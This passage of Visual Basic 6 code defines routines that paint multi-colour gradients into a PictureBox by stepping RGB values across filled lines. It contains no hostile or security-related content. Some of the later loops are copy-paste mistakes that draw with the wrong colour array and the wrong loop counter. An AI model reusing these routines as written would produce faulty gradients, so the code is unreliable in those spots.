SixthColor(1) = SixthColor(1) + Divide6Num(1)
SixthColor(2) = SixthColor(2) + Divide6Num(2)
SixthColor(3) = SixthColor(3) + Divide6Num(3)
Next Looo0000
For Looo00000 = 76 To 87
Picturebox.Line (Looo0000 * FadeW - 10, -10)-(9000, 1000), RGB(SixthColor(1), SixthColor(2), SixthColor(3)), BF
SeventhColor(1) = SeventhColor(1) + Divide7Num(1)
SeventhColor(2) = SeventhColor(2) + Divide7Num(2)
SeventhColor(3) = SeventhColor(3) + Divide7Num(3)
Next Looo00000
For Looo00000 = 89 To 100
Picturebox.Line (Looo0000 * FadeW - 10, -10)-(9000, 1000), RGB(SixthColor(1), SixthColor(2), SixthColor(3)), BF
EightColor(1) = EightColor(1) + Divide8Num(1)
EightColor(2) = EightColor(2) + Divide8Num(2)
EightColor(3) = EightColor(3) + Divide8Num(3)
Next Looo00000
End Sub
Public Sub FadePicturebox8Colors(Picturebox, R1, G1, B1, R2, G2, B2, R3, G3, B3, R4, G4, B4, R5, G5, B5, R6, G6, B6, r7, g7, b7, r8, g8, b8)
On Error Resume Next
Static FirstColor(3) As Double
Static SecondColor(3) As Double
Static ThirdColor(3) As Double
Static ForthColor(3) As Double
Static FifthColor(3) As Double
Static SixthColor(3) As Double
Static SeventhColor(3) As Double
Static EightColor(3) As Double
Static SplitNum(3) As Double
Static DivideNum(3) As Double
Static Split2Num(3) As Double
Static Divide2Num(3) As Double
Static Split3Num(3) As Double
Static Divide3Num(3) As Double
Static Split4Num(3) As Double
Static Divide4Num(3) As Double
Static Split5Num(3) As Double
Static Divide5Num(3) As Double
Static Split6Num(3) As Double
Static Divide6Num(3) As Double
Static Split7Num(3) As Double
Static Divide7Num(3) As Double
Dim FadeW As Integer
Dim Loo As Integer
Dim Loo0 As Integer
Dim Loo00 As Integer
Dim Loo000 As Integer
Dim Loo0000 As Integer
Dim Looo0000 As Integer
Dim Looo00000 As Integer
'Starting color
FirstColor(1) = R1
FirstColor(2) = G1
FirstColor(3) = B1
'Second color
SecondColor(1) = R2
SecondColor(2) = G2
SecondColor(3) = B2
'ThirdColor
ThirdColor(1) = R3
ThirdColor(2) = G3
ThirdColor(3) = B3
ForthColor(1) = R4
ForthColor(2) = G4
ForthColor(3) = B4
FifthColor(1) = R5
FifthColor(2) = G5
FifthColor(3) = B5
SixthColor(1) = R6
SixthColor(2) = G6
SixthColor(3) = B6
SeventhColor(1) = r7
SeventhColor(2) = g7
SeventhColor(3) = b7
EightColor(1) = r8
EightColor(2) = g8
EightColor(3) = b8
'Do some math
SplitNum(1) = SecondColor(1) - FirstColor(1)
SplitNum(2) = SecondColor(2) - FirstColor(2)
SplitNum(3) = SecondColor(3) - FirstColor(3)
Split2Num(1) = ThirdColor(1) - SecondColor(1)
Split2Num(2) = ThirdColor(2) - SecondColor(2)
Split2Num(3) = ThirdColor(3) - SecondColor(3)
Split3Num(1) = ForthColor(1) - ThirdColor(1)
Split3Num(2) = ForthColor(2) - ThirdColor(2)
Split3Num(3) = ForthColor(3) - ThirdColor(3)
Split4Num(1) = FifthColor(1) - ForthColor(1)
Split4Num(2) = FifthColor(2) - ForthColor(2)
Split4Num(3) = FifthColor(3) - ForthColor(3)
Split5Num(1) = SixthColor(1) - FifthColor(1)
Split5Num(2) = SixthColor(2) - FifthColor(2)
Split5Num(3) = SixthColor(3) - FifthColor(3)
Split6Num(1) = SeventhColor(1) - SixthColor(1)
Split6Num(2) = SeventhColor(2) - SixthColor(2)
Split6Num(3) = SeventhColor(3) - SixthColor(3)
Split7Num(1) = EightColor(1) - SeventhColor(1)
Split7Num(2) = EightColor(2) - SeventhColor(2)
Split7Num(3) = EightColor(3) - SeventhColor(3)
DivideNum(1) = SplitNum(1) / 18
DivideNum(2) = SplitNum(2) / 18
DivideNum(3) = SplitNum(3) / 18
Divide2Num(1) = Split2Num(1) / 16
Divide2Num(2) = Split2Num(2) / 16
Divide2Num(3) = Split2Num(3) / 16
Divide3Num(1) = Split3Num(1) / 16
Divide3Num(2) = Split3Num(2) / 16
Divide3Num(3) = Split3Num(3) / 16
Divide4Num(1) = Split4Num(1) / 16
Divide4Num(2) = Split4Num(2) / 16
Divide4Num(3) = Split4Num(3) / 16
Divide5Num(1) = Split5Num(1) / 16
Divide5Num(2) = Split5Num(2) / 16
Divide5Num(3) = Split5Num(3) / 16
Divide6Num(1) = Split6Num(1) / 18
Divide6Num(2) = Split6Num(2) / 18
Divide6Num(3) = Split6Num(3) / 18
Divide7Num(1) = Split7Num(1) / 18
Divide7Num(2) = Split7Num(2) / 18
Divide7Num(3) = Split7Num(3) / 18
FadeW = Picturebox.Width / 100
' Lets start fading!
For Loo = 0 To 14
Picturebox.Line (Loo * FadeW - 10, -10)-(9000, 1000), RGB(FirstColor(1), FirstColor(2), FirstColor(3)), BF
DoEvents
FirstColor(1) = FirstColor(1) + DivideNum(1)
FirstColor(2) = FirstColor(2) + DivideNum(2)
FirstColor(3) = FirstColor(3) + DivideNum(3)
Next Loo
For Loo0 = 15 To 30
Picturebox.Line (Loo0 * FadeW - 10, -10)-(9000, 1000), RGB(SecondColor(1), SecondColor(2), SecondColor(3)), BF
DoEvents
SecondColor(1) = SecondColor(1) + Divide2Num(1)
SecondColor(2) = SecondColor(2) + Divide2Num(2)
SecondColor(3) = SecondColor(3) + Divide2Num(3)
Next Loo0
For Loo00 = 31 To 46
Picturebox.Line (Loo00 * FadeW - 10, -10)-(9000, 1000), RGB(ThirdColor(1), ThirdColor(2), ThirdColor(3)), BF
DoEvents
ThirdColor(1) = ThirdColor(1) + Divide3Num(1)
ThirdColor(2) = ThirdColor(2) + Divide3Num(2)
ThirdColor(3) = ThirdColor(3) + Divide3Num(3)
Next Loo00
For Loo000 = 47 To 62
Picturebox.Line (Loo000 * FadeW - 10, -10)-(9000, 1000), RGB(ForthColor(1), ForthColor(2), ForthColor(3)), BF
ForthColor(1) = ForthColor(1) + Divide4Num(1)
ForthColor(2) = ForthColor(2) + Divide4Num(2)
ForthColor(3) = ForthColor(3) + Divide4Num(3)
Next Loo000
For Loo0000 = 63 To 68
Picturebox.Line (Loo0000 * FadeW - 10, -10)-(9000, 1000), RGB(FifthColor(1), FifthColor(2), FifthColor(3)), BF
FifthColor(1) = FifthColor(1) + Divide5Num(1)
FifthColor(2) = FifthColor(2) + Divide5Num(2)
FifthColor(3) = FifthColor(3) + Divide5Num(3)
Next Loo0000
For Looo0000 = 69 To 84
Picturebox.Line (Looo0000 * FadeW - 10, -10)-(9000, 1000), RGB(SixthColor(1), SixthColor(2), SixthColor(3)), BF
SixthColor(1) = SixthColor(1) + Divide6Num(1)
SixthColor(2) = SixthColor(2) + Divide6Num(2)
SixthColor(3) = SixthColor(3) + Divide6Num(3)
Next Looo0000
For Looo00000 = 85 To 100
Picturebox.Line (Looo0000 * FadeW - 10, -10)-(9000, 1000), RGB(SixthColor(1), SixthColor(2), SixthColor(3)), BF
SeventhColor(1) = SeventhColor(1) + Divide7Num(1)
SeventhColor(2) = SeventhColor(2) + Divide7Num(2)
SeventhColor(3) = SeventhColor(3) + Divide7Num(3)
Next Looo00000
End Sub
Function FadePicturebox7Colors(Picturebox, R1, G1, B1, R2, G2, B2, R3, G3, B3, R4, G4, B4, R5, G5, B5, R6, G6, B6, r7, g7, b7)
On Error Resume Next
Static FirstColor(3) As Double
Static SecondColor(3) As Double
Static ThirdColor(3) As Double
Static ForthColor(3) As Double
Static FifthColor(3) As Double
Static SixthColor(3) As Double
Static SeventhColor(3) As Double
Static SplitNum(3) As Double
Static DivideNum(3) As Double
Static Split2Num(3) As Double
Static Divide2Num(3) As Double
Static Split3Num(3) As Double
Static Divide3Num(3) As Double
Static Split4Num(3) As Double
Static Divide4Num(3) As Double
Static Split5Num(3) As Double
Static Divide5Num(3) As Double
Static Split6Num(3) As Double
Static Divide6Num(3) As Double
Dim FadeW As Integer
Dim Loo As Integer
Dim Loo0 As Integer
Dim Loo00 As Integer
Dim Loo000 As Integer
Dim Loo0000 As Integer
Dim Looo0000 As Integer
'Starting color
FirstColor(1) = R1
FirstColor(2) = G1
FirstColor(3) = B1
'Second color
SecondColor(1) = R2
SecondColor(2) = G2
SecondColor(3) = B2
'ThirdColor
ThirdColor(1) = R3
ThirdColor(2) = G3
ThirdColor(3) = B3
ForthColor(1) = R4
ForthColor(2) = G4
ForthColor(3) = B4
FifthColor(1) = R5
FifthColor(2) = G5
FifthColor(3) = B5
SixthColor(1) = R6
SixthColor(2) = G6
SixthColor(3) = B6
SeventhColor(1) = r7
SeventhColor(2) = g7
SeventhColor(3) = b7
'Do some math
SplitNum(1) = SecondColor(1) - FirstColor(1)
SplitNum(2) = SecondColor(2) - FirstColor(2)
SplitNum(3) = SecondColor(3) - FirstColor(3)
Split2Num(1) = ThirdColor(1) - SecondColor(1)
Split2Num(2) = ThirdColor(2) - SecondColor(2)
Split2Num(3) = ThirdColor(3) - SecondColor(3)
Split3Num(1) = ForthColor(1) - ThirdColor(1)
Split3Num(2) = ForthColor(2) - ThirdColor(2)
Split3Num(3) = ForthColor(3) - ThirdColor(3)
Split4Num(1) = FifthColor(1) - ForthColor(1)
Split4Num(2) = FifthColor(2) - ForthColor(2)
Split4Num(3) = FifthColor(3) - ForthColor(3)
Split5Num(1) = SixthColor(1) - FifthColor(1)
Split5Num(2) = SixthColor(2) - FifthColor(2)
Split5Num(3) = SixthColor(3) - FifthColor(3)
Split6Num(1) = SeventhColor(1) - SixthColor(1)
Split6Num(2) = SeventhColor(2) - SixthColor(2)
Split6Num(3) = SeventhColor(3) - SixthColor(3)
DivideNum(1) = SplitNum(1) / 18
DivideNum(2) = SplitNum(2) / 18
DivideNum(3) = SplitNum(3) / 18
Divide2Num(1) = Split2Num(1) / 16
Divide2Num(2) = Split2Num(2) / 16
Divide2Num(3) = Split2Num(3) / 16
Divide3Num(1) = Split3Num(1) / 16
Divide3Num(2) = Split3Num(2) / 16
Divide3Num(3) = Split3Num(3) / 16
Divide4Num(1) = Split4Num(1) / 16
Divide4Num(2) = Split4Num(2) / 16
Divide4Num(3) = Split4Num(3) / 16
Divide5Num(1) = Split5Num(1) / 16
Divide5Num(2) = Split5Num(2) / 16
Divide5Num(3) = Split5Num(3) / 16
Divide6Num(1) = Split6Num(1) / 18
Divide6Num(2) = Split6Num(2) / 18
Divide6Num(3) = Split6Num(3) / 18
FadeW = Picturebox.Width / 100
' Lets start fading!
For Loo = 0 To 16
Picturebox.Line (Loo * FadeW - 10, -10)-(9000, 1000), RGB(FirstColor(1), FirstColor(2), FirstColor(3)), BF
DoEvents
FirstColor(1) = FirstColor(1) + DivideNum(1)
FirstColor(2) = FirstColor(2) + DivideNum(2)
FirstColor(3) = FirstColor(3) + DivideNum(3)
Next Loo
For Loo0 = 17 To 32
Picturebox.Line (Loo0 * FadeW - 10, -10)-(9000, 1000), RGB(SecondColor(1), SecondColor(2), SecondColor(3)), BF
DoEvents
SecondColor(1) = SecondColor(1) + Divide2Num(1)
SecondColor(2) = SecondColor(2) + Divide2Num(2)
SecondColor(3) = SecondColor(3) + Divide2Num(3)
Next Loo0
For Loo00 = 33 To 48
Picturebox.Line (Loo00 * FadeW - 10, -10)-(9000, 1000), RGB(ThirdColor(1), ThirdColor(2), ThirdColor(3)), BF
DoEvents
ThirdColor(1) = ThirdColor(1) + Divide3Num(1)
ThirdColor(2) = ThirdColor(2) + Divide3Num(2)
ThirdColor(3) = ThirdColor(3) + Divide3Num(3)
Next Loo00
For Loo000 = 49 To 64
Picturebox.Line (Loo000 * FadeW - 10, -10)-(9000, 1000), RGB(ForthColor(1), ForthColor(2), ForthColor(3)), BF
ForthColor(1) = ForthColor(1) + Divide4Num(1)
ForthColor(2) = ForthColor(2) + Divide4Num(2)
ForthColor(3) = ForthColor(3) + Divide4Num(3)
Next Loo000
For Loo0000 = 65 To 80
Picturebox.Line (Loo0000 * FadeW - 10, -10)-(9000, 1000), RGB(FifthColor(1), FifthColor(2), FifthColor(3)), BF
FifthColor(1) = FifthColor(1) + Divide5Num(1)
FifthColor(2) = FifthColor(2) + Divide5Num(2)
FifthColor(3) = FifthColor(3) + Divide5Num(3)
Next Loo0000
For Looo0000 = 81 To 100
Picturebox.Line (Looo0000 * FadeW - 10, -10)-(9000, 1000), RGB(SixthColor(1), SixthColor(2), SixthColor(3)), BF
SixthColor(1) = SixthColor(1) + Divide6Num(1)
SixthColor(2) = SixthColor(2) + Divide6Num(2)
SixthColor(3) = SixthColor(3) + Divide6Num(3)
Next Looo0000
End Function
Public Sub FadePicturebox6Colors(Picturebox, R1, G1, B1, R2, G2, B2, R3, G3, B3, R4, G4, B4, R5, G5, B5, R6, G6, B6)
On Error Resume Next
Static FirstColor(3) As Double
Static SecondColor(3) As Double
Static ThirdColor(3) As Double
Static ForthColor(3) As Double
Static FifthColor(3) As Double
Static SixthColor(3) As Double
Static SplitNum(3) As Double
Static DivideNum(3) As Double
Static Split2Num(3) As Double
Static Divide2Num(3) As Double
Static Split3Num(3) As Double
Static Divide3Num(3) As Double
Static Split4Num(3) As Double
Static Divide4Num(3) As Double
Static Split5Num(3) As Double
Static Divide5Num(3) As Double
Dim FadeW As Integer
Dim Loo As Integer
Dim Loo0 As Integer
Dim Loo00 As Integer
Dim Loo000 As Integer
Dim Loo0000 As Integer
'Starting color
FirstColor(1) = R1
FirstColor(2) = G1
FirstColor(3) = B1
'Second color
SecondColor(1) = R2
SecondColor(2) = G2
SecondColor(3) = B2
'ThirdColor
ThirdColor(1) = R3
ThirdColor(2) = G3
ThirdColor(3) = B3
ForthColor(1) = R4
ForthColor(2) = G4
ForthColor(3) = B4
FifthColor(1) = R5
FifthColor(2) = G5
FifthColor(3) = B5
SixthColor(1) = R6
SixthColor(2) = G6
SixthColor(3) = B6
'Do some math
SplitNum(1) = SecondColor(1) - FirstColor(1)
SplitNum(2) = SecondColor(2) - FirstColor(2)
SplitNum(3) = SecondColor(3) - FirstColor(3)
Split2Num(1) = ThirdColor(1) - SecondColor(1)
Split2Num(2) = ThirdColor(2) - SecondColor(2)
Split2Num(3) = ThirdColor(3) - SecondColor(3)
Split3Num(1) = ForthColor(1) - ThirdColor(1)
Split3Num(2) = ForthColor(2) - ThirdColor(2)
Split3Num(3) = ForthColor(3) - ThirdColor(3)
Split4Num(1) = FifthColor(1) - ForthColor(1)
Split4Num(2) = FifthColor(2) - ForthColor(2)
Split4Num(3) = FifthColor(3) - ForthColor(3)
Split5Num(1) = SixthColor(1) - FifthColor(1)
Split5Num(2) = SixthColor(2) - FifthColor(2)
Split5Num(3) = SixthColor(3) - FifthColor(3)
DivideNum(1) = SplitNum(1) / 18
DivideNum(2) = SplitNum(2) / 18
DivideNum(3) = SplitNum(3) / 18
Divide2Num(1) = Split2Num(1) / 16
Divide2Num(2) = Split2Num(2) / 16
Divide2Num(3) = Split2Num(3) / 16
Divide3Num(1) = Split3Num(1) / 16
Divide3Num(2) = Split3Num(2) / 16
Divide3Num(3) = Split3Num(3) / 16
Divide4Num(1) = Split4Num(1) / 16
Divide4Num(2) = Split4Num(2) / 16
Divide4Num(3) = Split4Num(3) / 16
Divide5Num(1) = Split5Num(1) / 16
Divide5Num(2) = Split5Num(2) / 16
Divide5Num(3) = Split5Num(3) / 16
FadeW = Picturebox.Width / 100
' Lets start fading!
For Loo = 0 To 20
Picturebox.Line (Loo * FadeW - 10, -10)-(9000, 1000), RGB(FirstColor(1), FirstColor(2), FirstColor(3)), BF
DoEvents
FirstColor(1) = FirstColor(1) + DivideNum(1)
FirstColor(2) = FirstColor(2) + DivideNum(2)
FirstColor(3) = FirstColor(3) + DivideNum(3)
Next Loo
For Loo0 = 21 To 40
Picturebox.Line (Loo0 * FadeW - 10, -10)-(9000, 1000), RGB(SecondColor(1), SecondColor(2), SecondColor(3)), BF
DoEvents
SecondColor(1) = SecondColor(1) + Divide2Num(1)
SecondColor(2) = SecondColor(2) + Divide2Num(2)
SecondColor(3) = SecondColor(3) + Divide2Num(3)
Next Loo0
For Loo00 = 41 To 60
Picturebox.Line (Loo00 * FadeW - 10, -10)-(9000, 1000), RGB(ThirdColor(1), ThirdColor(2), ThirdColor(3)), BF
DoEvents
ThirdColor(1) = ThirdColor(1) + Divide3Num(1)
ThirdColor(2) = ThirdColor(2) + Divide3Num(2)
ThirdColor(3) = ThirdColor(3) + Divide3Num(3)
Next Loo00
For Loo000 = 61 To 80
Picturebox.Line (Loo000 * FadeW - 10, -10)-(9000, 1000), RGB(ForthColor(1), ForthColor(2), ForthColor(3)), BF
ForthColor(1) = ForthColor(1) + Divide4Num(1)
ForthColor(2) = ForthColor(2) + Divide4Num(2)
ForthColor(3) = ForthColor(3) + Divide4Num(3)
Next Loo000
For Loo0000 = 81 To 100
Picturebox.Line (Loo0000 * FadeW - 10, -10)-(9000, 1000), RGB(FifthColor(1), FifthColor(2), FifthColor(3)), BF
FifthColor(1) = FifthColor(1) + Divide5Num(1)
FifthColor(2) = FifthColor(2) + Divide5Num(2)
FifthColor(3) = FifthColor(3) + Divide5Num(3)
Next Loo0000
End Sub
Public Sub FadePicturebox5Colors(Picturebox, R1, G1, B1, R2, G2, B2, R3, G3, B3, R4, G4, B4, R5, G5, B5)
On Error Resume Next
Static FirstColor(3) As Double
Static SecondColor(3) As Double
Static ThirdColor(3) As Double
Static ForthColor(3) As Double
Static FifthColor(3) As Double
Static SplitNum(3) As Double
Static DivideNum(3) As Double
Static Split2Num(3) As Double
Static Divide2Num(3) As Double
Static Split3Num(3) As Double
Static Divide3Num(3) As Double
Static Split4Num(3) As Double
Static Divide4Num(3) As Double
Static Split5Num(3) As Double
Static Divide5Num(3) As Double
Dim FadeW As Integer
Dim Loo As Integer
Dim Loo0 As Integer
Dim Loo00 As Integer
Dim Loo000 As Integer
Dim Loo0000 As Integer
Dim Looo0000 As Integer
'Starting color
FirstColor(1) = R1
FirstColor(2) = G1
FirstColor(3) = B1
'Second color
SecondColor(1) = R2
SecondColor(2) = G2
SecondColor(3) = B2
'ThirdColor
ThirdColor(1) = R3
ThirdColor(2) = G3
ThirdColor(3) = B3
ForthColor(1) = R4
ForthColor(2) = G4
ForthColor(3) = B4
FifthColor(1) = R5
FifthColor(2) = G5
FifthColor(3) = B5
'Do some math
SplitNum(1) = SecondColor(1) - FirstColor(1)
SplitNum(2) = SecondColor(2) - FirstColor(2)
SplitNum(3) = SecondColor(3) - FirstColor(3)
Split2Num(1) = ThirdColor(1) - SecondColor(1)
Split2Num(2) = ThirdColor(2) - SecondColor(2)
Split2Num(3) = ThirdColor(3) - SecondColor(3)
Split3Num(1) = ForthColor(1) - ThirdColor(1)
Split3Num(2) = ForthColor(2) - ThirdColor(2)
Split3Num(3) = ForthColor(3) - ThirdColor(3)
Split4Num(1) = FifthColor(1) - ForthColor(1)
Split4Num(2) = FifthColor(2) - ForthColor(2)
Split4Num(3) = FifthColor(3) - ForthColor(3)
DivideNum(1) = SplitNum(1) / 18
DivideNum(2) = SplitNum(2) / 18
DivideNum(3) = SplitNum(3) / 18
Divide2Num(1) = Split2Num(1) / 16
Divide2Num(2) = Split2Num(2) / 16
Divide2Num(3) = Split2Num(3) / 16
Divide3Num(1) = Split3Num(1) / 16
Divide3Num(2) = Split3Num(2) / 16
Divide3Num(3) = Split3Num(3) / 16
Divide4Num(1) = Split4Num(1) / 16
Divide4Num(2) = Split4Num(2) / 16
Divide4Num(3) = Split4Num(3) / 16
FadeW = Picturebox.Width / 100
' Lets start fading!
For Loo = 0 To 25
Picturebox.Line (Loo * FadeW - 10, -10)-(9000, 1000), RGB(FirstColor(1), FirstColor(2), FirstColor(3)), BF
DoEvents
FirstColor(1) = FirstColor(1) + DivideNum(1)
FirstColor(2) = FirstColor(2) + DivideNum(2)
FirstColor(3) = FirstColor(3) + DivideNum(3)
Next Loo
For Loo0 = 26 To 50
Picturebox.Line (Loo0 * FadeW - 10, -10)-(9000, 1000), RGB(SecondColor(1), SecondColor(2), SecondColor(3)), BF
DoEvents
SecondColor(1) = SecondColor(1) + Divide2Num(1)
SecondColor(2) = SecondColor(2) + Divide2Num(2)
SecondColor(3) = SecondColor(3) + Divide2Num(3)
Next Loo0
For Loo00 = 51 To 75
Picturebox.Line (Loo00 * FadeW - 10, -10)-(9000, 1000), RGB(ThirdColor(1), ThirdColor(2), ThirdColor(3)), BF
DoEvents
ThirdColor(1) = ThirdColor(1) + Divide3Num(1)
ThirdColor(2) = ThirdColor(2) + Divide3Num(2)
ThirdColor(3) = ThirdColor(3) + Divide3Num(3)
Next Loo00
For Loo000 = 76 To 100
Picturebox.Line (Loo000 * FadeW - 10, -10)-(9000, 1000), RGB(ForthColor(1), ForthColor(2), ForthColor(3)), BF
ForthColor(1) = ForthColor(1) + Divide4Num(1)
ForthColor(2) = ForthColor(2) + Divide4Num(2)
ForthColor(3) = ForthColor(3) + Divide4Num(3)
Next Loo000
End Sub
Public Sub FadePicturebox4Colors(Picturebox, R1, G1, B1, R2, G2, B2, R3, G3, B3, R4, G4, B4)
On Error Resume Next
Static FirstColor(3) As Double
Static SecondColor(3) As Double
Static ThirdColor(3) As Double
Static ForthColor(3) As Double
Static FifthColor(3) As Double
Static SplitNum(3) As Double
Static DivideNum(3) As Double
Static Split2Num(3) As Double
Static Divide2Num(3) As Double
Static Split3Num(3) As Double
Static Divide3Num(3) As Double
Static Split4Num(3) As Double
Static Divide4Num(3) As Double
Dim FadeW As Integer
Dim Loo As Integer
Dim Loo0 As Integer
Dim Loo00 As Integer
Dim Loo000 As Integer
Dim Loo0000 As Integer
'Starting color
FirstColor(1) = R1
FirstColor(2) = G1
FirstColor(3) = B1
'Second color
SecondColor(1) = R2
SecondColor(2) = G2
SecondColor(3) = B2
'ThirdColor
ThirdColor(1) = R3
ThirdColor(2) = G3
ThirdColor(3) = B3
ForthColor(1) = R4
ForthColor(2) = G4
ForthColor(3) = B4
'Do some math
SplitNum(1) = SecondColor(1) - FirstColor(1)
SplitNum(2) = SecondColor(2) - FirstColor(2)
SplitNum(3) = SecondColor(3) - FirstColor(3)
Split2Num(1) = ThirdColor(1) - SecondColor(1)
Split2Num(2) = ThirdColor(2) - SecondColor(2)
Split2Num(3) = ThirdColor(3) - SecondColor(3)
Split3Num(1) = ForthColor(1) - ThirdColor(1)
Split3Num(2) = ForthColor(2) - ThirdColor(2)
Split3Num(3) = ForthColor(3) - ThirdColor(3)
DivideNum(1) = SplitNum(1) / 18
DivideNum(2) = SplitNum(2) / 18
DivideNum(3) = SplitNum(3) / 18
Divide2Num(1) = Split2Num(1) / 16
Divide2Num(2) = Split2Num(2) / 16
Divide2Num(3) = Split2Num(3) / 16
Divide3Num(1) = Split3Num(1) / 16
Divide3Num(2) = Split3Num(2) / 16
Divide3Num(3) = Split3Num(3) / 16
FadeW = Picturebox.Width / 100
' Lets start fading!
For Loo = 0 To 33
Picturebox.Line (Loo * FadeW - 10, -10)-(9000, 1000), RGB(FirstColor(1), FirstColor(2), FirstColor(3)), BF
DoEvents
FirstColor(1) = FirstColor(1) + DivideNum(1)
FirstColor(2) = FirstColor(2) + DivideNum(2)
FirstColor(3) = FirstColor(3) + DivideNum(3)
Next Loo
For Loo0 = 34 To 66
Picturebox.Line (Loo0 * FadeW - 10, -10)-(9000, 1000), RGB(SecondColor(1), SecondColor(2), SecondColor(3)), BF
DoEvents
SecondColor(1) = SecondColor(1) + Divide2Num(1)
SecondColor(2) = SecondColor(2) + Divide2Num(2)
SecondColor(3) = SecondColor(3) + Divide2Num(3)
Next Loo0
For Loo00 = 67 To 100
Picturebox.Line (Loo00 * FadeW - 10, -10)-(9000, 1000), RGB(ThirdColor(1), ThirdColor(2), ThirdColor(3)), BF
DoEvents
ThirdColor(1) = ThirdColor(1) + Divide3Num(1)
ThirdColor(2) = ThirdColor(2) + Divide3Num(2)
ThirdColor(3) = ThirdColor(3) + Divide3Num(3)
Next Loo00
End Sub
Public Sub FadePicturebox3Colors(Picturebox, R1, G1, B1, R2, G2, B2, R3, G3, B3)
On Error Resume Next
Static FirstColor(3) As Double
Static SecondColor(3) As Double
Static ThirdColor(3) As Double
Static ForthColor(3) As Double
Static FifthColor(3) As Double
Static SplitNum(3) As Double
Static DivideNum(3) As Double
Static Split2Num(3) As Double
Static Divide2Num(3) As Double
Static Split3Num(3) As Double
Static Divide3Num(3) As Double
Dim FadeW As Integer
Dim Loo As Integer
Dim Loo0 As Integer
Dim Loo00 As Integer
Dim Loo000 As Integer
'Starting color
FirstColor(1) = R1
FirstColor(2) = G1
FirstColor(3) = B1
'Second color
SecondColor(1) = R2
SecondColor(2) = G2
SecondColor(3) = B2
'ThirdColor
ThirdColor(1) = R3
ThirdColor(2) = G3
ThirdColor(3) = B3
'Do some math
SplitNum(1) = SecondColor(1) - FirstColor(1)
SplitNum(2) = SecondColor(2) - FirstColor(2)
SplitNum(3) = SecondColor(3) - FirstColor(3)
Split2Num(1) = ThirdColor(1) - SecondColor(1)
Split2Num(2) = ThirdColor(2) - SecondColor(2)
Split2Num(3) = ThirdColor(3) - SecondColor(3)
DivideNum(1) = SplitNum(1) / 18
DivideNum(2) = SplitNum(2) / 18
DivideNum(3) = SplitNum(3) / 18
Divide2Num(1) = Split2Num(1) / 16
Divide2Num(2) = Split2Num(2) / 16
Divide2Num(3) = Split2Num(3) / 16
FadeW = Picturebox.Width / 100
' Lets start fading!
For Loo = 0 To 50
Picturebox.Line (Loo * FadeW - 10, -10)-(9000, 1000), RGB(FirstColor(1), FirstColor(2), FirstColor(3)), BF
DoEvents
FirstColor(1) = FirstColor(1) + DivideNum(1)
FirstColor(2) = FirstColor(2) + DivideNum(2)
FirstColor(3) = FirstColor(3) + DivideNum(3)
Next Loo
For Loo0 = 51 To 100
Picturebox.Line (Loo0 * FadeW - 10, -10)-(9000, 1000), RGB(SecondColor(1), SecondColor(2), SecondColor(3)), BF
DoEvents
SecondColor(1) = SecondColor(1) + Divide2Num(1)
SecondColor(2) = SecondColor(2) + Divide2Num(2)
SecondColor(3) = SecondColor(3) + Divide2Num(3)
Next Loo0
End Sub
Public Sub FadePictureBox2Colors(frm As Picturebox, TopColor&, BottomColor&)
Dim SaveScale%, SaveStyle%, SaveRedraw%, ThisColor&
Dim I&, J&, X&, Y&, pixels%
Dim RedDelta As Single, GreenDelta As Single, BlueDelta As Single
Dim aRed As Single, aGreen As Single, aBlue As Single
Dim TopColorRed%, TopColorGreen%, TopColorBlue%
Dim BottomColorRed%, BottomColorGreen%, BottomColorBlue%
SaveScale = frm.ScaleMode
SaveStyle = frm.DrawStyle
SaveRedraw = frm.AutoRedraw
frm.ScaleMode = 3
TopColorRed = TopColor And 255
TopColorGreen = (TopColor And 65280) / 256
TopColorBlue = (TopColor And 16711680) / 65536
BottomColorRed = BottomColor And 255
BottomColorGreen = (BottomColor And 65280) / 256
BottomColorBlue = (BottomColor And 16711680) / 65536
    aRed = TopColorRed
    aGreen = TopColorGreen
    aBlue = TopColorBlue
    pixels = frm.ScaleWidth
    If pixels <= 0 Then Exit Sub
    ColorDifRed = (BottomColorRed - TopColorRed)
    ColorDifGreen = (BottomColorGreen - TopColorGreen)
    ColorDifBlue = (BottomColorBlue - TopColorBlue)
    RedDelta = ColorDifRed / pixels
    GreenDelta = ColorDifGreen / pixels
    BlueDelta = ColorDifBlue / pixels
    frm.DrawStyle = 5
    frm.AutoRedraw = True
For Y = 0 To pixels
        aRed = aRed + RedDelta
        If aRed < 0 Then aRed = 0
        aGreen = aGreen + GreenDelta
        If aGreen < 0 Then aGreen = 0
        aBlue = aBlue + BlueDelta
        If aBlue < 0 Then aBlue = 0
        ThisColor = RGB(aRed, aGreen, aBlue)
        If ThisColor > -1 Then
        frm.Line (Y - 2, -2)-(Y - 2, frm.Height + 2), ThisColor, BF
        End If
    Next Y
frm.ScaleMode = SaveScale
frm.DrawStyle = SaveStyle
frm.AutoRedraw = SaveRedraw
End Sub
Public Sub FadePicturebox10Colors(Picturebox, R1, G1, B1, R2, G2, B2, R3, G3, B3, R4, G4, B4, R5, G5, B5, R6, G6, B6, r7, g7, b7, r8, g8, b8, R9, G9, B9, R10, G10, B10)
On Error Resume Next
Static FirstColor(3) As Double
Static SecondColor(3) As Double
Static ThirdColor(3) As Double
Static ForthColor(3) As Double
Static FifthColor(3) As Double
Static SixthColor(3) As Double
Static SeventhColor(3) As Double
Static EightColor(3) As Double
Static NinethColor(3) As Double
Static TenthColor(3) As Double
Static SplitNum(3) As Double
Static DivideNum(3) As Double
Static Split2Num(3) As Double
Static Divide2Num(3) As Double
Static Split3Num(3) As Double
Static Divide3Num(3) As Double
Static Split4Num(3) As Double
Static Divide4Num(3) As Double
Static Split5Num(3) As Double
Static Divide5Num(3) As Double
Static Split6Num(3) As Double
Static Divide6Num(3) As Double
Static Split7Num(3) As Double
Static Divide7Num(3) As Double
Static Split8Num(3) As Double
Static Divide8Num(3) As Double
Static Split9Num(3) As Double
Static Divide9Num(3) As Double
Dim FadeW As Integer
Dim Loo As Integer
Dim Loo0 As Integer
Dim Loo00 As Integer
Dim Loo000 As Integer
Dim Loo0000 As Integer
Dim Looo0000 As Integer
Dim Looo00000 As Integer
Dim Looo000000 As Integer
Dim Looo0000000 As Integer
'Starting color
FirstColor(1) = R1
FirstColor(2) = G1
FirstColor(3) = B1
'Second color
SecondColor(1) = R2
SecondColor(2) = G2
SecondColor(3) = B2
'ThirdColor
ThirdColor(1) = R3
ThirdColor(2) = G3
ThirdColor(3) = B3
ForthColor(1) = R4
ForthColor(2) = G4
ForthColor(3) = B4
FifthColor(1) = R5
FifthColor(2) = G5
FifthColor(3) = B5
SixthColor(1) = R6
SixthColor(2) = G6
SixthColor(3) = B6
SeventhColor(1) = r7
SeventhColor(2) = g7
SeventhColor(3) = b7
EightColor(1) = r8
EightColor(2) = g8
